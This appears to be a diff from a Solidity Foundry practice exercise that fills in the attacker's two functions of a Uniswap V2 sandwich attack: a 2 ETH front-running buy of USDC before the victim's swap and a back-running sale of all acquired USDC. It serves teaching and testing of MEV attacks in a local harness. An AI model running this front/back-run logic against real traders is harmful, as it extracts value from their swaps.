@@ -2,6 +2,7 @@
 pragma solidity 0.8.17;
 
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 import { SandwichSetUp } from "./helper/SandwichSetUp.sol";
 
 contract SandwichPracticeTest is SandwichSetUp {
@@ -13,6 +14,7 @@ contract SandwichPracticeTest is SandwichSetUp {
     uint256 makerInitialUsdcBalance;
     uint256 attackerInitialEthBalance;
     uint256 victimInitialEthBalance;
+    uint256 attackerAmountOut;
 
     function setUp() public override {
         super.setUp();
@@ -74,7 +76,7 @@ contract SandwichPracticeTest is SandwichSetUp {
             block.timestamp
         );
         vm.stopPrank();
-
+        console.log('usdc.balanceOf(victim)',usdc.balanceOf(victim));
         // check victim usdc balance >= originalUsdcAmountOutMin (93780012)
         assertGe(usdc.balanceOf(victim), originalUsdcAmountOutMin);
     }
@@ -83,12 +85,43 @@ contract SandwichPracticeTest is SandwichSetUp {
     function _attackerAction1() internal {
         // victim swap ETH to USDC (front-run victim)
         // implement here
+        vm.startPrank(attacker);
+
+        address[] memory path = new address[](2);
+        path[0] = address(weth);
+        path[1] = address(usdc);
+
+        uint256 amountIn = 2 ether;
+        
+        uniswapV2Router.swapExactETHForTokens{ value: amountIn }(
+            0,
+            path,
+            attacker,
+            block.timestamp
+        );
+
+        vm.stopPrank();
     }
 
     // # Practice 2: attacker sandwich attack
     function _attackerAction2() internal {
         // victim swap USDC to ETH
         // implement here
+        vm.startPrank(attacker);
+        address[] memory path = new address[](2);
+        path[0] = address(usdc);
+        path[1] = address(weth);
+    
+        usdc.approve(address(uniswapV2Router), usdc.balanceOf(attacker));
+        uniswapV2Router.swapExactTokensForETH(
+            usdc.balanceOf(attacker),
+            // usdc.balanceOf(victim),
+            0,
+            path,
+            attacker,
+            block.timestamp
+        );
+        vm.stopPrank();
     }
 
     // # Discussion 2: how to maximize profit ?
